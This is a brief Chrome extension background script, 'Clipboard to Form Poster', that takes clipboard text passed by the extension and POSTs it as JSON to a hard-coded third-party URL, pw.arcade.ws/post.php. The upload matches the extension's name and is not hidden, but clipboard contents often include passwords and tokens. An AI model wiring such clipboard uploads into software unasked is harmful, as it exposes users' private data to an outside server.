chrome.runtime.onInstalled.addListener(() => {
    console.log("Clipboard to Form Poster extension installed.");
  });
  
  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "clipboard") {
      postClipboardContent(message.content);
    }
  });
  
  function postClipboardContent(content) {
    // Here you would define how to handle the clipboard content
    // For example, you can use fetch to post it to a specific endpoint
    console.log("Content to post:", content);
    // Example: POST content to a specific URL
    fetch('https://pw.arcade.ws/post.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ clipboardContent: content }),
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch(error => console.error('Error:', error));
  }
  